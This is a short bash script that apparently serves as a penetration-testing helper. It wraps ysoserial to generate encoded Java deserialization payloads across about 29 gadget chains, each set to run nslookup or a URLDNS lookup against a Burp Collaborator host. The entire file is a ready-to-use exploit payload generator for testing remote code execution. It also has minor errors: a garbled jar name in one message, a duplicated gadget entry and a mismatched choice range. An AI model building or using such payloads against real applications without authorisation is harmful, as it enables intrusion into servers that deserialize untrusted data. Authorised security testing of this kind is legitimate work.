#!/bin/bash

# Check for ysoserial.jar
if [ ! -f "ysoserial-all.jar" ]; then
  echo "❌ ysoserial.-alljar not found in current directory!"
  exit 1
fi

# Ask for collaborator link
read -p "🔗 Enter your Burp Collaborator link (e.g. abc123.burpcollaborator.net): " COLLAB

# List of gadget chains
gadgets=(
  "URLDNS"
  "CommonsCollections1"
  "CommonsCollections2"
  "CommonsCollections3"
  "CommonsCollections4"
  "CommonsCollections5"
  "CommonsCollections6"
  "CommonsCollections7"
  "CommonsCollections10"
  "Spring1"
  "Spring2"
  "Groovy1"
  "BeanShell1"
  "Clojure"
  "JavaAssistWeld1"
  "Jdk7u21"
  "MozillaRhino1"
  "MozillaRhino2"
  "Myfaces1"
  "Hibernate1"
  "Hibernate2"
  "AspectJWeaver"
  "Vaadin1"
  "ROME"
  "JRMPClient"
  "JBossInterceptors1"
  "CommonsBeanutils1"
  "Clojure"
  "Click1"
)

# Print gadget menu
echo "📦 Choose a payload type:"
for i in "${!gadgets[@]}"; do
  printf "%2d. %s\n" "$i" "${gadgets[$i]}"
done

# Get user choice
read -p "👉 Enter the number (0-29): " choice

# Validate input
if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 0 ] || [ "$choice" -ge "${#gadgets[@]}" ]; then
  echo "❌ Invalid choice!"
  exit 1
fi

gadget=${gadgets[$choice]}

# Special case for URLDNS (uses URL, not command)
if [ "$gadget" == "URLDNS" ]; then
  cmd="http://$COLLAB"
else
  cmd="nslookup $COLLAB"
fi

echo "⚙️  Generating payload using $gadget..."

# Run ysoserial and encode
payload=$(java -jar ysoserial-all.jar "$gadget" "$cmd" | base64 -w0 | jq -s -R -r @uri)

echo -e "\n🔐 Encoded Payload:\n$payload"
